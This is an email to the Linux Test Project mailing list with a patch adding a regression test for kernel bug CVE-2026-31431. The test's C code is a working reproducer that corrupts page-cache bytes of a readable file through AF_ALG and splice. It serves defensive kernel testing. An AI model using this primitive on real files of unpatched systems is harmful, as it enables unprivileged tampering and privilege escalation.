Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 2427DFF8875
	for <ltp@archiver.kernel.org>; Thu, 30 Apr 2026 10:17:39 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id D155D3E65B0
	for <ltp@archiver.kernel.org>; Thu, 30 Apr 2026 12:17:37 +0200 (CEST)
Received: from in-2.smtp.seeweb.it (in-2.smtp.seeweb.it
 [IPv6:2001:4b78:1:20::2])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id CD92E3E1A52
 for <ltp@lists.linux.it>; Thu, 30 Apr 2026 12:17:17 +0200 (CEST)
Received: from smtp-out1.suse.de (smtp-out1.suse.de [195.135.223.130])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-2.smtp.seeweb.it (Postfix) with ESMTPS id 4E11A60026D
 for <ltp@lists.linux.it>; Thu, 30 Apr 2026 12:17:17 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (unknown [10.150.64.97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out1.suse.de (Postfix) with ESMTPS id AF8426A803;
 Thu, 30 Apr 2026 10:17:16 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1777544236; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=DumUA1pg1gFRBHsFGzJAuBPDzBGDXyd6FycHMGI+CnA=;
 b=XFfjuZ2w5zy+tFyTsejlrUrc3qk2SQ+Kwk9m8VorkBusiOdcu1+7xbBgEkU+fDYi0gYVyS
 b+HzD0r7r7TIzGd4oUL8Kt2i0cd9at2a8rUm4T2HPGvnmkhO7DxyacTvFP0gz5mq7zo7fZ
 hb09y55pOHIkxe//spUe/dkx2buoyGk=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1777544236;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=DumUA1pg1gFRBHsFGzJAuBPDzBGDXyd6FycHMGI+CnA=;
 b=6NraV8SbObpTkPUmPDXxt3D1dWfOeMy03LHG1WYEMhtdzuFmZO6GHrFrtJgWZOEanVosvx
 JIEDnSt+CCTIJnAA==
Authentication-Results: smtp-out1.suse.de;
	none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1777544236; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=DumUA1pg1gFRBHsFGzJAuBPDzBGDXyd6FycHMGI+CnA=;
 b=XFfjuZ2w5zy+tFyTsejlrUrc3qk2SQ+Kwk9m8VorkBusiOdcu1+7xbBgEkU+fDYi0gYVyS
 b+HzD0r7r7TIzGd4oUL8Kt2i0cd9at2a8rUm4T2HPGvnmkhO7DxyacTvFP0gz5mq7zo7fZ
 hb09y55pOHIkxe//spUe/dkx2buoyGk=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1777544236;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=DumUA1pg1gFRBHsFGzJAuBPDzBGDXyd6FycHMGI+CnA=;
 b=6NraV8SbObpTkPUmPDXxt3D1dWfOeMy03LHG1WYEMhtdzuFmZO6GHrFrtJgWZOEanVosvx
 JIEDnSt+CCTIJnAA==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 90146593B0;
 Thu, 30 Apr 2026 10:17:16 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id R/noICws82kScwAAD6G6ig
 (envelope-from <andrea.cervesato@suse.de>); Thu, 30 Apr 2026 10:17:16 +0000
From: Andrea Cervesato <andrea.cervesato@suse.de>
Date: Thu, 30 Apr 2026 12:17:14 +0200
MIME-Version: 1.0
Message-Id: <20260430-cve-2026-31431-v1-1-7fdc16c25785@suse.com>
X-B4-Tracking: v=1; b=H4sIACks82kC/6tWKk4tykwtVrJSqFYqSi3LLM7MzwNyDHUUlJIzE
 vPSU3UzU4B8JSMDIzMDE2MD3eSyVF0QR9fY0MTYUDc1JdHEyNI8xdQsKVkJqKmgKDUtswJsYHR
 sbS0ADCTSfWAAAAA=
X-Change-ID: 20260430-cve-2026-31431-eda4297d56bc
To: Linux Test Project <ltp@lists.linux.it>
X-Mailer: b4 0.14.2
X-Developer-Signature: v=1; a=ed25519-sha256; t=1777544236; l=6897;
 i=andrea.cervesato@suse.com; s=20251210; h=from:subject:message-id;
 bh=S/GBJgJZ9Pq34TF9mz2UvgScf8nbYIq4dh8uuMTIRhw=;
 b=7qEhFK8TrQHNuxG+7jMkMSF67WCAmvb9MstKAg6s70Y8VrXtZNIqIv8F4tjwm05BG2DNBtOGK
 1/jF6xiWahzC65IKvzTPzrynfIZ8UL38HFSbuYiYf72R8/e23vrGEs4
X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
 pk=zKY+6GCauOiuHNZ//d8PQ/UL4jFCTKbXrzXAOQSLevI=
X-Spamd-Result: default: False [-4.30 / 50.00]; BAYES_HAM(-3.00)[100.00%];
 NEURAL_HAM_LONG(-1.00)[-1.000];
 NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
 RCVD_TLS_ALL(0.00)[]; RCPT_COUNT_TWO(0.00)[2];
 FUZZY_RATELIMITED(0.00)[rspamd.com];
 RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
 DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 URIBL_BLOCKED(0.00)[suse.com:mid,suse.com:email,imap1.dmz-prg2.suse.org:helo]; 
 TO_DN_ALL(0.00)[]; FROM_HAS_DN(0.00)[]; MIME_TRACE(0.00)[0:+];
 FROM_EQ_ENVFROM(0.00)[]; TO_MATCH_ENVRCPT_ALL(0.00)[];
 RCVD_COUNT_TWO(0.00)[2];
 DBL_BLOCKED_OPENRESOLVER(0.00)[imap1.dmz-prg2.suse.org:helo, suse.com:mid,
 suse.com:email]
X-Virus-Scanned: clamav-milter 1.0.9 at in-2.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH] cve-2026-31431: Add page cache corruption reproducer
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

From: Andrea Cervesato <andrea.cervesato@suse.com>

A logic bug in authencesn allows an unprivileged user to corrupt
4 bytes of page cache via AF_ALG + splice. The test writes known
data to a file, attempts corruption through the AEAD scratch-write
path, and verifies whether the file content was modified.

Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
---
 runtest/cve                    |   1 +
 testcases/cve/.gitignore       |   1 +
 testcases/cve/cve-2026-31431.c | 172 +++++++++++++++++++++++++++++++++++++++++
 3 files changed, 174 insertions(+)

diff --git a/runtest/cve b/runtest/cve
index c3ecd74dd9f837924b810b7b431ebb911d809966..499cbb3bc4170453560c329133e2c52b5a3b8c5c 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -93,3 +93,4 @@ cve-2022-0185 fsconfig03
 cve-2022-4378 cve-2022-4378
 cve-2025-38236 cve-2025-38236
 cve-2025-21756 cve-2025-21756
+cve-2026-31431 cve-2026-31431
diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
index dc1dad5b0d0d02a3ab57e72516c33ee7949c8431..f8e2b7a7d0a6c0c32f8908ae9974ead6a57f358b 100644
--- a/testcases/cve/.gitignore
+++ b/testcases/cve/.gitignore
@@ -15,3 +15,4 @@ icmp_rate_limit01
 tcindex01
 cve-2025-38236
 cve-2025-21756
+cve-2026-31431
diff --git a/testcases/cve/cve-2026-31431.c b/testcases/cve/cve-2026-31431.c
new file mode 100644
index 0000000000000000000000000000000000000000..b762096c1ecb940267ab2a337130939763f75452
--- /dev/null
+++ b/testcases/cve/cve-2026-31431.c
@@ -0,0 +1,172 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
+ */
+
+/*\
+ * Test for CVE-2026-31431 ("Copy Fail") fixed in kernel v7.0:
+ * a664bf3d603d ("crypto: algif_aead - Separate src from dst")
+ *
+ * A logic bug in authencesn, the kernel's AEAD wrapper for IPsec Extended
+ * Sequence Numbers, allows an unprivileged user to write 4 controlled bytes
+ * into the page cache of any readable file. During AEAD decryption,
+ * authencesn uses the destination scatterlist as scratch space for ESN byte
+ * rearrangement. When data is spliced from a file into an AF_ALG socket, the
+ * 2017 in-place optimization (72548b093ee3) places page cache pages into the
+ * writable destination scatterlist. authencesn's scratch write then corrupts
+ * those pages.
+ *
+ * The test creates a file with known data, attempts page cache corruption via
+ * the AF_ALG + splice technique, and verifies whether the file content was
+ * modified.
+ *
+ * Reproducer based on:
+ * https://github.com/theori-io/copy-fail-CVE-2026-31431
+ */
+
+#include "tst_test.h"
+#include "tst_af_alg.h"
+#include "lapi/socket.h"
+#include "lapi/splice.h"
+
+#define TESTFILE "copy_fail"
+#define OVERWRITE_SIZE 4
+#define AEAD_AUTHSIZE 4
+#define AEAD_ASSOCLEN 8
+#define AES_IV_SIZE 16
+#define SPI_SIZE 4
+
+static const uint8_t original[OVERWRITE_SIZE] = { 'X', 'X', 'X', 'X' };
+static const uint8_t payload[OVERWRITE_SIZE] = { 'P', 'W', 'N', 'D' };
+
+/*
+ * authenc key format: struct rtattr header (8 bytes) +
+ * HMAC-SHA256 key (16 bytes) + AES-128 key (16 bytes)
+ */
+static const uint8_t authenc_key[] = {
+	0x08, 0x00, 0x01, 0x00,
+	0x00, 0x00, 0x00, 0x10,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+};
+
+static void try_corrupt(int fd)
+{
+	int algfd, reqfd, pipefd[2];
+	loff_t off_in = 0;
+	uint8_t aad[AEAD_ASSOCLEN];
+	uint8_t iv[AES_IV_SIZE] = { 0 };
+	struct af_alg_iv *alg_iv;
+	struct cmsghdr *cmsg;
+	char recvbuf[AEAD_ASSOCLEN];
+
+	/* AAD[0..3] = SPI (don't care), AAD[4..7] = ESN scratch-write zone */
+	memset(aad, 'A', SPI_SIZE);
+	memcpy(aad + SPI_SIZE, payload, OVERWRITE_SIZE);
+
+	algfd = tst_alg_setup("aead", "authencesn(hmac(sha256),cbc(aes))",
+			      authenc_key, sizeof(authenc_key));
+	SAFE_SETSOCKOPT(algfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL,
+			AEAD_AUTHSIZE);
+
+	reqfd = tst_alg_accept(algfd);
+
+	struct iovec iov = {
+		.iov_base = aad,
+		.iov_len = sizeof(aad),
+	};
+
+	uint8_t cbuf[CMSG_SPACE(sizeof(uint32_t)) +
+		     CMSG_SPACE(sizeof(struct af_alg_iv) + AES_IV_SIZE) +
+		     CMSG_SPACE(sizeof(uint32_t))];
+
+	memset(cbuf, 0, sizeof(cbuf));
+
+	struct msghdr msg = {
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+		.msg_control = cbuf,
+		.msg_controllen = sizeof(cbuf),
+	};
+
+	cmsg = CMSG_FIRSTHDR(&msg);
+	cmsg->cmsg_level = SOL_ALG;
+	cmsg->cmsg_type = ALG_SET_OP;
+	cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));
+	*(uint32_t *)CMSG_DATA(cmsg) = ALG_OP_DECRYPT;
+
+	cmsg = CMSG_NXTHDR(&msg, cmsg);
+	cmsg->cmsg_level = SOL_ALG;
+	cmsg->cmsg_type = ALG_SET_IV;
+	cmsg->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + AES_IV_SIZE);
+	alg_iv = (struct af_alg_iv *)CMSG_DATA(cmsg);
+	alg_iv->ivlen = AES_IV_SIZE;
+	memcpy(alg_iv->iv, iv, AES_IV_SIZE);
+
+	cmsg = CMSG_NXTHDR(&msg, cmsg);
+	cmsg->cmsg_level = SOL_ALG;
+	cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
+	cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));
+	*(uint32_t *)CMSG_DATA(cmsg) = AEAD_ASSOCLEN;
+
+	SAFE_SENDMSG(sizeof(aad), reqfd, &msg, MSG_MORE);
+
+	SAFE_PIPE(pipefd);
+
+	TEST(splice(fd, &off_in, pipefd[1], NULL, OVERWRITE_SIZE, 0));
+	if (TST_RET < 0)
+		tst_brk(TBROK | TTERRNO, "splice(file -> pipe)");
+
+	TEST(splice(pipefd[0], NULL, reqfd, NULL, OVERWRITE_SIZE, 0));
+	if (TST_RET < 0)
+		tst_brk(TBROK | TTERRNO, "splice(pipe -> AF_ALG)");
+
+	/* Expected to fail (invalid ciphertext); triggers the scratch write */
+	TST_EXP_FAIL_SILENT(recv(reqfd, recvbuf, sizeof(recvbuf), 0), EBADMSG);
+
+	SAFE_CLOSE(pipefd[0]);
+	SAFE_CLOSE(pipefd[1]);
+	SAFE_CLOSE(reqfd);
+	SAFE_CLOSE(algfd);
+}
+
+static void run(void)
+{
+	int file_fd;
+	uint8_t readback[OVERWRITE_SIZE];
+
+	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
+	try_corrupt(file_fd);
+	SAFE_CLOSE(file_fd);
+
+	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
+	SAFE_READ(1, file_fd, readback, sizeof(readback));
+	SAFE_CLOSE(file_fd);
+
+	if (memcmp(readback, original, OVERWRITE_SIZE) != 0)
+		tst_res(TFAIL, "Page cache was corrupted via AF_ALG splice");
+	else
+		tst_res(TPASS, "Page cache was not corrupted");
+}
+
+static void setup(void)
+{
+	int fd;
+
+	fd = SAFE_OPEN(TESTFILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+	SAFE_WRITE(SAFE_WRITE_ALL, fd, original, OVERWRITE_SIZE);
+	SAFE_CLOSE(fd);
+}
+
+static struct tst_test test = {
+	.test_all = run,
+	.setup = setup,
+	.needs_tmpdir = 1,
+	.tags = (const struct tst_tag[]) {
+		{"linux-git", "a664bf3d603d"},
+		{"CVE", "2026-31431"},
+		{}
+	},
+};

---
base-commit: 69b8169310425b8c5abd01d3fdb46f6d939e8a66
change-id: 20260430-cve-2026-31431-eda4297d56bc

Best regards,
-- 
Andrea Cervesato <andrea.cervesato@suse.com>


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
